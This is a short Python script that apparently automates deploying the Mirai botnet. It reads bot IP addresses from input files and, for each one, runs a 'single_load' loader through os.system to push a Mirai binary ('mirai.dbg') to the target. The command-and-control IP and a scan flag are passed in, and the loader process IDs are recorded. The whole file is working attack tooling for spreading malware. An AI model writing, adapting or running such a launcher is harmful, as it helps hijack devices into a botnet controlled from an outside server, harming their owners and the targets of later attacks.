import os
import sys
import glob
import time


def main(argv):
    if len(argv) != 5:
        print("Usage: {} cnc_ip input_bot scan_flag pids_file".format(argv[0]))

    cnc_ip = argv[1]
    input_bot = argv[2]
    scan_flag = argv[3]
    pids_file = argv[4]

    single_load = "single_load"
    mirai_exec_file = "./mirai.dbg"

    for input_file in glob.glob("{0}*.txt".format(input_bot)):
        bot_ip = ''
        with open(input_file, 'rt') as rf:
            line = rf.readline()
            infor = line.strip().split(':')
            bot_ip = infor[0]
        cmd = './{0} {1} {2} {3} \"{4} {5} {6} {7}\" 1 1 1 &'.format(single_load, cnc_ip, input_file, mirai_exec_file, cnc_ip, bot_ip, cnc_ip, scan_flag)
        os.system(cmd)

    cmd = 'ps -ef | grep \'{0}\' | awk \'{{print $2}}\' > {1}'.format(single_load, pids_file)
    os.system(cmd)


main(sys.argv)
